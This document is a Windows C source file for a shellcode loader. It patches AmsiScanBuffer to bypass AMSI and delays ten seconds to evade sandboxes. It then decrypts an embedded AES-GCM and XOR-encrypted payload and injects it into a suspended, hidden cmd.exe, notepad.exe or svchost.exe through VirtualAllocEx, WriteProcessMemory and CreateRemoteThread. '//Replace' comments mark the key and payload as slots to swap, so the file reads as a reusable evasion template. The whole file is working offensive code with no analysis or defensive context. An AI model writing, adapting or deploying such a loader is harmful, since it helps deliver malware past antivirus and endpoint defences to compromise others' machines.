#include <windows.h>
#include <string.h>
#include <tlhelp32.h>
#include <openssl/evp.h>

#define AES_KEY_SIZE 32
#define GCM_IV_SIZE 12
#define GCM_TAG_SIZE 16
#define XOR_KEY 0xd6 //Replace


void bypass_amsi() {
    HMODULE h = LoadLibraryA("amsi.dll");
    if (h) {
        void* a = GetProcAddress(h, "AmsiScanBuffer");
        if (a) {
            DWORD o;
            VirtualProtect(a, 6, PAGE_EXECUTE_READWRITE, &o);
            *(BYTE*)a = 0xC3;
            VirtualProtect(a, 6, o, &o);
        }
    }
}

int decrypt(unsigned char* ct, int ct_len, unsigned char* key,
            unsigned char* iv, unsigned char* tag, unsigned char* pt) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return -1;
    
    int len, pt_len;
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, GCM_IV_SIZE, NULL) != 1 ||
        EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv) != 1 ||
        EVP_DecryptUpdate(ctx, pt, &len, ct, ct_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    pt_len = len;
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, GCM_TAG_SIZE, tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return -1;
    }
    
    int ret = EVP_DecryptFinal_ex(ctx, pt + len, &len);
    EVP_CIPHER_CTX_free(ctx);
    
    return (ret > 0) ? pt_len + len : -1;
}


BOOL InjectIntoProcess(HANDLE hProcess, unsigned char* payload, size_t size) {

    LPVOID remoteAddr = VirtualAllocEx(
        hProcess,
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!remoteAddr) return FALSE;
    

    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteAddr, payload, size, &written)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }
    

    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteAddr, size, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }
    

    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteAddr,
        NULL,
        0,
        NULL
    );
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }
    
    CloseHandle(hThread);
    return TRUE;
}
//Replace
unsigned char shellcode_encrypted[] = 
"\x7a\x4c\x0a\x38\xda\x09\x9d\x77\xda\x65\x6a\x43\xce\x31\xbb\x9e"
"\xaa\xe2\x47\x41\x57\x6f\xd4\x2b\x02\x91\xf2\x86\x6a\x47\xa2\x56"
"\xeb\xd5\x43\xd6\x72\x54\xce\xd9\xcb\xa3\x23\x34\x98\x74\x2b\x02"
"\xfa\x44\xfe\xe3\x5f\x84\xa2\x8c\x8c\xc4\x99\x6c\xdf\x90\xa8\xfd"
"\x5f\xf4\xa7\x36\x08\xc8\xdb\x91\xbe\x5d\x6d\xd9\xb6\xfd\xc7\xab"
"\xa3\x04\xee\x5b\x9a\x6c\x6f\x18\xb3\x04\x29\x84\x64\xa8\xf2\x45"
"\xd1\x55\x15\x27\xcf\xe4\x3f\x22\xc1\x32\x4e\x65\x0e\x17\xde\x43"
"\xa8\x0d\x6c\xac\xf7\xa8\x75\x0f\x93\x38\x51\xaa\x19\x39\x27\x09"
"\x30\x34\xcf\x22\xc4\x7f\x69\xd8\xdc\xa5\xb1\x91\x9f\x4d\x5b\x6d"
"\xab\xfb\xa5\x9a\x09\x4a\x77\x1d\x2c\x4e\xde\x32\x30\x3c\x17\xb5"
"\x7a\xeb\x95\x1d\x56\x04\x54\x06\x9d\x74\x54\x83\x89\xcd\x65\x9e"
"\x05\x0c\x73\x55\xed\xf7\xcb\x30\x52\x13\x11\xeb\xbe\x4b\xfa\x88"
"\x90\x8f\x43\xa9\xbc\x0e\x4a\x71\x4f\xe2\xda\x77\x1f\xe8\xe1\x3f"
"\x40\x0c\x9e\xf4\xc4\x09\xbe\xe8\x0d\x68\xe0\x7a\x8a\xe9\xbb\x62"
"\x89\x63\x5a\xc7\xbd\xb6\x0f\x10\x2f\xd9\x9c\x04\x30\xaf\xc5\x00"
"\xad\x96\x64\x37\x32\xd0\x62\x54\xa1\x59\x70\x6c\x88\x75\x62\xaf"
"\xcb\xf9\x7c\x75\xa9\x3c\x7e\x10\x9e\xe4\xfe\x7b\x0d\x5e\xf1\xa3"
"\x96\xb9\x19\x4b\x90\x87\xc4\x1f\x00\xd8\x74\x7a\x88\x49\xbe\x1d"
"\x06\xeb\xf8\x70\xf0\x54\x9c\xdd\x27\xb1\xa4\x99\xc1\x1c\x50\x83"
"\xf0\x9b\x6e\x77\x52\x75\xd3\xaa\xcc\xd4\xea\xc1\x77\x96\xa1\xa2"
"\xad\x35\x49\x12\x5f\xd9\xcf\x2c\x44\xbd\x17\x25\xfc\x66\x8a\xbf"
"\x4a\x9b\x57\x57\x99\xe1\xa8\x1d\xaa\x22\x67\x20\xb7\x36\xbd\xf9"
"\xb3\x45\x15\xe1\x51\x68\x68\x3b\x02\xa4\x00\x11\xa3\x17\x00\x03"
"\x25\x55\x16\xfb\x24\xf8\x23\xad\xb8\xec\xa4\x83\x63\x9b\x25\x31"
"\xab\xbd\x0f\xd2\x3f\x09\x3d\x9e\x43\xd4\x4d\x27\x22\xc5\x0c\xac"
"\xe9\xc4\x6e\x8a\x20\x47\x2b\xd2\x9d\xbc\x78\xb1\x12\x4e\x91\x68"
"\x92\xf7\x85\xe6\xfd\x83\xce\x46\x2e\xed\x3c\xd3\x3a\xe1\xa4\xe2"
"\xf7\xdb\x95\x88\x57\x14\x92\x17\xb6\xcc\x66\x56\x6b\xcf\x60\xc1"
"\x4e\xbd\xa8\xa7\xa9\x15\x18\x81\x33\x5c\x0c\x0d\xf1\x72\xa6\xf9"
"\x49\xf6\xcc\xca\x00\x55\x98\xc7\x6c\x0f\xf0\x8f\xb9\x8a\x64\x6a"
"\xfd\x4a\x91\x82\x8c\xd2\x67\xdb\x34\x08\x57\x5d\xb2\x2e\x72\x69"
"\x1b\xa3\xa2\x27\x47\xb1\xee\x3c\xeb\xc7\x8b\xfc\x2e\x8e\x20\x98"
"\xd9\xfc\x65\x5e\xa6\x87\x98\xbc\x83\x23\xb2\x0d\x78\x0e\x10\x23"
"\x9c\x23\xe9\x14\x53\x3f\x6a\xdf\xc6\xd9";

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    Sleep(10000);
    bypass_amsi();
    

    DWORD enc_len = sizeof(shellcode_encrypted) - 1;
    const char* keyHex = "4e4077f758ba7605078ac6a613124ec1f37300c72038a46bac958f657f008546"; //Replace
    
    if (enc_len < GCM_IV_SIZE + GCM_TAG_SIZE) return 0;
    
    unsigned char key[AES_KEY_SIZE];
    for (int i = 0; i < AES_KEY_SIZE; i++) {
        sscanf(keyHex + 2*i, "%2hhx", &key[i]);
    }
    
    unsigned char iv[GCM_IV_SIZE];
    memcpy(iv, shellcode_encrypted, GCM_IV_SIZE);
    
    DWORD ct_len = enc_len - GCM_IV_SIZE - GCM_TAG_SIZE;
    unsigned char* ct = shellcode_encrypted + GCM_IV_SIZE;
    unsigned char tag[GCM_TAG_SIZE];
    memcpy(tag, shellcode_encrypted + GCM_IV_SIZE + ct_len, GCM_TAG_SIZE);
    
    unsigned char* pt = (unsigned char*)malloc(ct_len);
    if (!pt) return 0;
    
    int pt_len = decrypt(ct, ct_len, key, iv, tag, pt);
    if (pt_len < 0) {
        free(pt);
        return 0;
    }
    
    for (int i = 0; i < pt_len; i++) pt[i] ^= XOR_KEY;
    

    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    

    const char* targets[] = {
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\System32\\svchost.exe"
    };
    
    BOOL spawned = FALSE;
    for (int i = 0; i < 3; i++) {
        if (CreateProcessA(
            targets[i],
            NULL,
            NULL,
            NULL,
            FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        )) {
            spawned = TRUE;
            break;
        }
    }
    
    if (!spawned) {
        free(pt);
        return 0;
    }
    

    
    BOOL injected = InjectIntoProcess(pi.hProcess, pt, pt_len);
    
    free(pt);
    
    if (injected) {

        ResumeThread(pi.hThread);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        return 0;
    } else {

        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return 0;
    }
}
